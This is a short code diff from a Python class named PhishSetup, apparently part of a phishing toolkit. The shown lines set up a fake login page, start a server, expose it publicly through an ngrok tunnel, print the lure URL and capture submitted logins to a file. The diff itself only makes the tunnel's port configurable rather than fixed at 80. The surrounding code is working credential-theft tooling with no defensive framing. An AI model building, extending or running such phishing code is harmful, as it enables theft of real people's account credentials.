@@ -149,7 +149,8 @@ class PhishSetup:
                 self.phishcreate.setup_phish_page()
                 self.start_server()
                 os.system("clear")
-                listener = ngrok.forward(80,authtoken=token)
+                port = self.sources.port_apache
+                listener = ngrok.forward(port,authtoken=token)
                 print(f"{BLUE}URL -->{RESET} {GREEN}{listener.url()}{RESET}")
                 self.sources.capture_logins(self.phishcreate.login_data_file_path)
             except KeyboardInterrupt:
